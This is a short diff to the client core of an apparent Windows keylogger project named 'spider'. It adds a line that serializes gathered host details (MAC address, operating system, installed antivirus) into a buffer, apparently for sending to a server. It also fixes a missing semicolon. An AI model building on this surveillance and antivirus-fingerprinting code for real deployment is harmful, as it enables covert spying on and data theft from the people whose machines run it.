@@ -8,6 +8,7 @@
 ** Last update Thu Oct 05 10:59:44 2017 Maxime PILLON
 */
 
+#include "Protocol/Buffer.hpp"
 #include "Protocol/ClientProtocol.hpp"
 #include "Protocol/ServerProtocol.hpp"
 #include "WindowsKeyLogger.hpp"
@@ -32,12 +33,13 @@ void spider::ClientCore::run()
   keylogger.getMacAddr();
   keylogger.getOperatingSystem();
   keylogger.getAntiVirus();
+  spider::Buffer::BufferInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(keylogger.getInfos())));
   while (running)
   {
     if (!GetMessage(&msg, NULL, 0, 0))
       running = false;
     TranslateMessage(&msg);
     DispatchMessage(&msg);
-    _proto.run()
+    _proto.run();
   }
 }
